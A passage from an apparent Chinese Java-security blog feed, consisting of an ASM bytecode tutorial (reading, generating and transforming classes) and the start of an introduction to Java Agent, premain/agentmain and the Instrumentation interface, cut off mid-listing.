<li><a href="https://fynch3r.github.io/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/">https://fynch3r.github.io/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/</a></li>
<li></li>
</ul>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title>Java ASM</title>
    <url>/Java-ASM/</url>
    <content><![CDATA[<p><font style="color:Gray; float:left">若菩萨有我相、人相、众生相、寿者相，即非菩萨。</font><br></p>
<p><font style="color:Gray; float:right">——《金刚般若波罗蜜经》</font></p>
<br>

<p>ASM入门</p>
<span id="more"></span>



<h2 id="1-概念"><a href="#1-概念" class="headerlink" title="1. 概念"></a>1. 概念</h2><p><a href="http://asm.ow2.org/">ASM</a> 是一个 Java 字节码操控框架。它能被用来动态生成类或者增强既有类的功能。ASM 可以直接产生二进制 class 文件，也可以在类被加载入 Java 虚拟机之前动态改变类行为。Java class 被存储在严格格式定义的 .class 文件里，这些类文件拥有足够的元数据来解析类中的所有元素：类名称、方法、属性以及 Java 字节码（指令）。ASM 从类文件中读入信息后，能够改变类行为，分析类信息，甚至能够根据用户要求生成新类。</p>
<p>简单的说，ASM可以读取解析<code>class</code>文件内容，并提供接口让你可以对<code>class</code>文件字节码内容进行CRUD操作。</p>
<p>ASM一般用于动态代理，我们知道JDK通过反射也实现了动态代理，但这种方式的缺点就是性能低，通过ASM可以在字节码层面进行原有类修改。</p>
<h2 id="2-使用"><a href="#2-使用" class="headerlink" title="2. 使用"></a>2. 使用</h2><p>参考<a href="https://asm.ow2.io/asm4-guide.pdf">ASM用户手册</a>，用户手册我们关注怎么用就行了。</p>
<p>ASM provides three core components based on the ClassVisitor API to generate and transform classes: •</p>
<ul>
<li>The ClassReader class parses a compiled class given as a byte array, and calls the corresponding visitXxx methods on the ClassVisitor instance passed as argument to its accept method. It can be seen as an event producer. </li>
<li>The ClassWriter class is a subclass of the ClassVisitor abstract class that builds compiled classes directly in binary form. It produces as output a byte array containing the compiled class, which can be retrieved with the toByteArray method. It can be seen as an event consumer. •</li>
<li>The ClassVisitor class delegates all the method calls it receives to another ClassVisitor instance. It can be seen as an event filter. The next sections show with concrete examples how these components can be used to generate and transform classes.</li>
</ul>
<p> ClassVisitor 接口提供了三个核心组件。</p>
<ul>
<li><p><strong>ClassReader</strong></p>
<p>读取编译过的class文件，对其解析</p>
</li>
<li><p><strong>ClassWriter</strong></p>
<p>直接生成一个class</p>
</li>
<li><p><strong>ClassVisitor</strong></p>
<p>ASM API用于生成和修改class文件都是基于ClassVisitor，通过重写ClassVisitor的方法来实现字节码的读取、修改与生成。</p>
</li>
</ul>
<h3 id="2-1-ClassReader"><a href="#2-1-ClassReader" class="headerlink" title="2.1 ClassReader"></a>2.1 ClassReader</h3><p>解析指定类的class文件</p>
<p>这里我们直接复制文档中的代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ASM;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> jdk.internal.org.objectweb.asm.Opcodes.ASM4;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassPrinter</span> <span class="keyword">extends</span> <span class="title">ClassVisitor</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ClassPrinter</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(ASM4);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visit</span><span class="params">(<span class="keyword">int</span> version, <span class="keyword">int</span> access, String name,</span></span></span><br><span class="line"><span class="params"><span class="function">                      String signature, String superName, String[] interfaces)</span> </span>&#123;</span><br><span class="line">        System.out.println(name + <span class="string">&quot; extends &quot;</span> + superName + <span class="string">&quot; &#123;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitSource</span><span class="params">(String source, String debug)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitOuterClass</span><span class="params">(String owner, String name, String desc)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> AnnotationVisitor <span class="title">visitAnnotation</span><span class="params">(String desc, <span class="keyword">boolean</span> visible)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitAttribute</span><span class="params">(Attribute attr)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitInnerClass</span><span class="params">(String name, String outerName, String innerName, <span class="keyword">int</span> access)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> FieldVisitor <span class="title">visitField</span><span class="params">(<span class="keyword">int</span> access, String name, String desc,</span></span></span><br><span class="line"><span class="params"><span class="function">                                   String signature, Object value)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot; &quot;</span> + desc + <span class="string">&quot; &quot;</span> + name);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> MethodVisitor <span class="title">visitMethod</span><span class="params">(<span class="keyword">int</span> access, String name,</span></span></span><br><span class="line"><span class="params"><span class="function">                                     String desc, String signature, String[] exceptions)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot; &quot;</span> + name + desc);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitEnd</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ClassPrinter cp = <span class="keyword">new</span> ClassPrinter();</span><br><span class="line">        ClassReader cr = <span class="keyword">new</span> ClassReader(<span class="string">&quot;java.lang.Runnable&quot;</span>);</span><br><span class="line">        cr.accept(cp, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行结果</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">java<span class="regexp">/lang/</span>Runnable <span class="keyword">extends</span> java<span class="regexp">/lang/</span>Object &#123;</span><br><span class="line"> run()V</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面的程序重写了visit， visitField方法，visitMethod等方法，运行结果成功获取到了Runnable类信息。</p>
<p>读一下自己写的类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">       ClassPrinter cp = <span class="keyword">new</span> ClassPrinter();</span><br><span class="line">       ClassReader cr = <span class="keyword">new</span> ClassReader(<span class="string">&quot;ASM.HelloWorld&quot;</span>);</span><br><span class="line">       cr.accept(cp, <span class="number">0</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">ASM<span class="regexp">/HelloWorld extends java/</span>lang/Object &#123;</span><br><span class="line"> &lt;init&gt;()V</span><br><span class="line"> main([Ljava<span class="regexp">/lang/</span>String;)V</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="2-2-ClassWriter"><a href="#2-2-ClassWriter" class="headerlink" title="2.2 ClassWriter"></a>2.2 ClassWriter</h3><p>直接生成类的字节码。</p>
<p>我们需要生成一个接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> pkg;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Comparable</span> <span class="keyword">extends</span> <span class="title">Mesurable</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> LESS = -<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">int</span> EQUAL = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> GREATER = <span class="number">1</span>;</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">compareTo</span><span class="params">(Object o)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>还是使用文档中的代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ASM;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassWriter;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> jdk.internal.org.objectweb.asm.Opcodes.*;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassWriteTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ClassWriter cw = <span class="keyword">new</span> ClassWriter(<span class="number">0</span>);</span><br><span class="line">        cw.visit(V1_5, ACC_PUBLIC + ACC_ABSTRACT + ACC_INTERFACE,</span><br><span class="line">                <span class="string">&quot;pkg/Comparable&quot;</span>, <span class="keyword">null</span>, <span class="string">&quot;java/lang/Object&quot;</span>,</span><br><span class="line">                <span class="keyword">null</span>);</span><br><span class="line">        cw.visitField(ACC_PUBLIC + ACC_FINAL + ACC_STATIC, <span class="string">&quot;LESS&quot;</span>, <span class="string">&quot;I&quot;</span>,</span><br><span class="line">                <span class="keyword">null</span>, <span class="keyword">new</span> Integer(-<span class="number">1</span>)).visitEnd();</span><br><span class="line">        cw.visitField(ACC_PUBLIC + ACC_FINAL + ACC_STATIC, <span class="string">&quot;EQUAL&quot;</span>, <span class="string">&quot;I&quot;</span>,</span><br><span class="line">                <span class="keyword">null</span>, <span class="keyword">new</span> Integer(<span class="number">0</span>)).visitEnd();</span><br><span class="line">        cw.visitField(ACC_PUBLIC + ACC_FINAL + ACC_STATIC, <span class="string">&quot;GREATER&quot;</span>, <span class="string">&quot;I&quot;</span>,</span><br><span class="line">                <span class="keyword">null</span>, <span class="keyword">new</span> Integer(<span class="number">1</span>)).visitEnd();</span><br><span class="line">        cw.visitMethod(ACC_PUBLIC + ACC_ABSTRACT, <span class="string">&quot;compareTo&quot;</span>,</span><br><span class="line">                <span class="string">&quot;(Ljava/lang/Object;)I&quot;</span>, <span class="keyword">null</span>, <span class="keyword">null</span>).visitEnd();</span><br><span class="line">        cw.visitEnd();</span><br><span class="line">        <span class="keyword">byte</span>[] b = cw.toByteArray();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//通过classloader读取字节码</span></span><br><span class="line">        MyClassLoader myClassLoader = <span class="keyword">new</span> MyClassLoader();</span><br><span class="line">        Class c = myClassLoader.defineClass(<span class="string">&quot;pkg.Comparable&quot;</span>, b);</span><br><span class="line">        System.out.println(c.getMethods()[<span class="number">0</span>].getName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>改动一下，删除掉了<code>new String[] &#123; &quot;pkg/Mesurable&quot; &#125;</code>这是继承类，这里用不上。</p>
<p>通过重写ClassLoader的defineClass方法将生成的字节码读取以便访问</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ASM;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyClassLoader</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Class <span class="title">defineClass</span><span class="params">(String name, <span class="keyword">byte</span>[] b)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> defineClass(name, b, <span class="number">0</span>, b.length);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>当然上面也可以用<code>FindClass()</code>来读取class</p>
<p>ClassWriteTest的执行结果如下</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">compareTo</span></span><br></pre></td></tr></table></figure>





<h3 id="2-3-Transforming-classes"><a href="#2-3-Transforming-classes" class="headerlink" title="2.3 Transforming classes"></a>2.3 Transforming classes</h3><p>先写一个Run类和一个Test类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ASM;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Run</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;程序运行起来了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ASM;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       System.out.println(<span class="string">&quot;先测试......&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们要实现的功能就是通过ASM插入JVM指令，在调用Run类前先执行<code>test()</code>方法，并生成class文件</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ASM;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassReader;</span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassVisitor;</span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassWriter;</span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.MethodVisitor;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> jdk.internal.org.objectweb.asm.Opcodes.ASM4;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> jdk.internal.org.objectweb.asm.Opcodes.INVOKESTATIC;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassTransferTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ClassReader cr = <span class="keyword">new</span> ClassReader(ClassPrinter.class.getClassLoader().getResourceAsStream(<span class="string">&quot;ASM/Run.class&quot;</span>));</span><br><span class="line"></span><br><span class="line">        ClassWriter cw = <span class="keyword">new</span> ClassWriter(<span class="number">0</span>);</span><br><span class="line">        ClassVisitor cv = <span class="keyword">new</span> ClassVisitor(ASM4, cw) &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> MethodVisitor <span class="title">visitMethod</span><span class="params">(<span class="keyword">int</span> i, String s, String s1, String s2, String[] strings)</span> </span>&#123;</span><br><span class="line">                MethodVisitor mv = <span class="keyword">super</span>.visitMethod(i, s, s1, s2, strings);</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> MethodVisitor(ASM4, mv) &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                        visitMethodInsn(INVOKESTATIC, <span class="string">&quot;ASM/Test&quot;</span>, <span class="string">&quot;test&quot;</span>, <span class="string">&quot;()V&quot;</span>, <span class="keyword">false</span>);</span><br><span class="line">                        <span class="keyword">super</span>.visitCode();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        cr.accept(cv,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] b2 = cw.toByteArray();</span><br><span class="line">        MyClassLoader cl = <span class="keyword">new</span> MyClassLoader();</span><br><span class="line">        cl.loadClass(<span class="string">&quot;ASM.Test&quot;</span>);</span><br><span class="line">        Class c2 = cl.defineClass(<span class="string">&quot;ASM.Run&quot;</span>, b2);</span><br><span class="line">        c2.getConstructor().newInstance();</span><br><span class="line"></span><br><span class="line">        String path = (String)System.getProperties().get(<span class="string">&quot;user.dir&quot;</span>);</span><br><span class="line">        File f = <span class="keyword">new</span> File(path + <span class="string">&quot;/ASM/&quot;</span>);</span><br><span class="line">        f.mkdirs();</span><br><span class="line">        System.out.println(<span class="string">&quot;生成的class文件地址：&quot;</span> + path + <span class="string">&quot;/ASM/Run_0.class&quot;</span>);</span><br><span class="line">        FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(path + <span class="string">&quot;/ASM/Run_0.class&quot;</span>));</span><br><span class="line">        fos.write(b2);</span><br><span class="line">        fos.flush();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>生成的class文件为</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> ASM;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Run</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Test.test();</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Test.test();</span><br><span class="line">        System.out.println(<span class="string">&quot;程序运行起来了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>成功通过<code>visitMethodInsn(INVOKESTATIC, &quot;ASM/Test&quot;, &quot;test&quot;, &quot;()V&quot;, false);</code>指令将<code>test()</code>插入了run的类并生成了字节码。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>参考文档，我们通过ASM框架对class文件进行了读取、修改与生成。</p>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Java安全</tag>
        <tag>Java字节码</tag>
      </tags>
  </entry>
  <entry>
    <title>Java-Agent</title>
    <url>/Java-Agent/</url>
    <content><![CDATA[<blockquote>
<p>春水碧于天，画船听雨眠。</p>
</blockquote>
<p>Java Agent学习</p>
<span id="more"></span>

<h2 id="1-概念"><a href="#1-概念" class="headerlink" title="1. 概念"></a>1. 概念</h2><h3 id="JVMTI"><a href="#JVMTI" class="headerlink" title="JVMTI"></a>JVMTI</h3><p>JVMTI(JVM Tool Interface)是Java虚拟机对外提供的Native编程接口，通过JVMTI，外部进程可以获取到运行时JVM的诸多信息，比如线程、GC等。</p>
<h3 id="Java-Agent"><a href="#Java-Agent" class="headerlink" title="Java Agent"></a>Java Agent</h3><p><code>JDK1.5</code>开始，<code>Java</code>新增了<code>Instrumentation(Java Agent API)</code>和<code>JVMTI(JVM Tool Interface)</code>功能，允许<code>JVM</code>在加载某个class文件之前对其字节码进行修改，同时也支持对已加载的<code>class(类字节码)</code>进行重新加载(<code>Retransform</code>)。</p>
<p>利用<code>Java Agent</code>这一特性衍生出了<code>APM(Application Performance Management，应用性能管理)</code>、<code>RASP(Runtime application self-protection，运行时应用自我保护)</code>、<code>IAST(Interactive Application Security Testing，交互式应用程序安全测试)</code>等相关产品，它们都无一例外的使用了<code>Instrumentation/JVMTI</code>的<code>API</code>来实现动态修改<code>Java类字节码</code>并插入监控或检测代码。</p>
<p><strong><code>Java Agent</code>有两种运行模式：</strong></p>
<ol>
<li>启动<code>Java程序</code>时添加<code>-javaagent(Instrumentation API实现方式)</code>或<code>-agentpath/-agentlib(JVMTI的实现方式)</code>参数，如<code>java -javaagent:/data/XXX.jar LingXeTest</code>。</li>
<li><code>JDK1.6</code>新增了<code>attach(附加方式)</code>方式，可以对运行中的<code>Java进程</code>附加<code>Agent</code>。</li>
</ol>
<p>这两种运行方式的最大区别在于第一种方式只能在程序启动时指定<code>Agent</code>文件，而<code>attach</code>方式可以在<code>Java程序</code>运行后根据<code>进程ID</code>动态注入<code>Agent</code>到<code>JVM</code>。</p>
<h2 id="2-Java-Agent"><a href="#2-Java-Agent" class="headerlink" title="2. Java Agent"></a>2. Java Agent</h2><p>Java Agent和普通的Java类并没有任何区别，普通的Java程序中规定了<code>main</code>方法为程序入口，而Java Agent则将<code>premain</code>（Agent模式）和<code>agentmain</code>（Attach模式）作为了Agent程序的入口，两者所接受的参数是完全一致的，如下：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">void</span> <span class="function"><span class="title">premain</span>(<span class="params"><span class="built_in">String</span> args, Instrumentation inst</span>)</span> &#123;&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">void</span> <span class="function"><span class="title">agentmain</span>(<span class="params"><span class="built_in">String</span> args, Instrumentation inst</span>)</span> &#123;&#125;</span><br></pre></td></tr></table></figure>

<p>Java Agent还限制了我们必须以jar包的形式运行或加载，我们必须将编写好的Agent程序打包成一个jar文件。除此之外，Java Agent还强制要求了所有的jar文件中必须包含<code>/META-INF/MANIFEST.MF</code>文件，且该文件中必须定义好<code>Premain-Class</code>（Agent模式）或<code>Agent-Class:</code>（Agent模式）配置，如：</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">Premain-Class: com<span class="selector-class">.anbai</span><span class="selector-class">.sec</span><span class="selector-class">.agent</span><span class="selector-class">.CrackLicenseAgent</span></span><br><span class="line">Agent-Class: com<span class="selector-class">.anbai</span><span class="selector-class">.sec</span><span class="selector-class">.agent</span>.CrackLicenseAgent</span><br></pre></td></tr></table></figure>

<p>如果我们需要修改已经被JVM加载过的类的字节码，那么还需要设置在<code>MANIFEST.MF</code>中添加<code>Can-Retransform-Classes: true</code>或<code>Can-Redefine-Classes: true</code>。</p>
<h3 id="javaagent参数"><a href="#javaagent参数" class="headerlink" title="javaagent参数"></a>javaagent参数</h3><p>Javaagent是java命令的一个参数。参数Javaagent可以用于指定一个Jar包，并且对该java包有两个要求：</p>
<ol>
<li>这个jar包的MANIFEST.MF文件必须指定Premain-Class 项</li>
<li>Premain-Class指定的那个类必须实现premain()方法。</li>
</ol>
<p>premain方法，从字面上理解，就是运行在main函数之前的方法。当java虚拟机启动的时候，在执行main函数之前，JVM先运行-javaagent所指定jar包内Premain-Class这个类的premain方法。</p>
<p>在命令行输入Java可以看到相应的参数，其中有和java agent相关的。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">-agentlib:&lt;libname&gt;[=&lt;选项&gt;]</span><br><span class="line">                  加载本机代理库 &lt;libname&gt;, 例如 -agentlib:hprof</span><br><span class="line">                  另请参阅 -agentlib:jdwp=help 和 -agentlib:hprof=help</span><br><span class="line">    -agentpath:&lt;pathname&gt;[=&lt;选项&gt;]</span><br><span class="line">                  按完整路径名加载本机代理库</span><br><span class="line">    -javaagent:&lt;jarpath&gt;[=&lt;选项&gt;]</span><br><span class="line">                  加载 Java 编程语言代理, 请参阅 java.lang.instrument</span><br></pre></td></tr></table></figure>

<p>在上面参数中提到的参阅<code>java.lang.instrument</code>,这是rt.jar中定义的一个包，该路径有两个重要的类类。</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ClassFileTransformer</span></span><br><span class="line"><span class="attribute">Instrumentation</span></span><br></pre></td></tr></table></figure>

<p>该包提供了一些工具帮助开发人员在 Java 程序运行时，动态修改系统中的 Class 类型。javaagent的功能更像是一个Class类型的转换器，他可以在运行时接收重新外部请求，对Class类型进行修改。</p>
<p>从本质上将，Java Agent是一个遵守一组严格约定的常规java类。上面说到javaagent命令要求指定类中必须有premain()方法，并且对premain方法的签名也有要求，签名必须满足以下两种格式</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">premain</span><span class="params">(<span class="keyword">String</span> agentArgs, Instrumentation inst)</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">premain</span><span class="params">(<span class="keyword">String</span> agentArgs)</span></span></span><br></pre></td></tr></table></figure>

<p>JVM会优先加载带Instrumentation签名的方法，成功加载忽略第二种，如果第一种没有，则加载第二种方法。这个逻辑在sun.instrument.InstrumentationImpl类的loadClassAndStartAgent方法中。</p>
<h3 id="Instrumentation定义"><a href="#Instrumentation定义" class="headerlink" title="Instrumentation定义"></a>Instrumentation定义</h3><p>位置：<code>java/lang/instrument/Instrumentation.java</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Instrumentation</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//增加一个Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">addTransformer</span><span class="params">(ClassFileTransformer transformer, <span class="keyword">boolean</span> canRetransform)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//在类加载之前，重新定义 Class 文件，ClassDefinition 表示对一个类新的定义，如果在类加载之后，需要使用 retransformClasses 方法重新定义。addTransformer方法配置之后，后续的类加载都会被Transformer拦截。对于已经加载过的类，可以执行retransformClasses来重新触发这个Transformer的拦截。类加载的字节码被修改后，除非再次被retransform，否则不会恢复。</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">addTransformer</span><span class="params">(ClassFileTransformer transformer)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//删除一个类转换器</span></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">removeTransformer</span><span class="params">(ClassFileTransformer transformer)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">isRetransformClassesSupported</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//在类加载之后，重新定义 Class。这个很重要，该方法是1.6 之后加入的，事实上，该方法是 update 了一个类。</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">retransformClasses</span><span class="params">(Class&lt;?&gt;... classes)</span> <span class="keyword">throws</span> UnmodifiableClassException</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">isRedefineClassesSupported</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">redefineClasses</span><span class="params">(ClassDefinition... definitions)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span>  ClassNotFoundException, UnmodifiableClassException</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">isModifiableClass</span><span class="params">(Class&lt;?&gt; theClass)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;rawtypes&quot;)</span></span><br><span class="line">    Class[] getAllLoadedClasses();</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">    <span 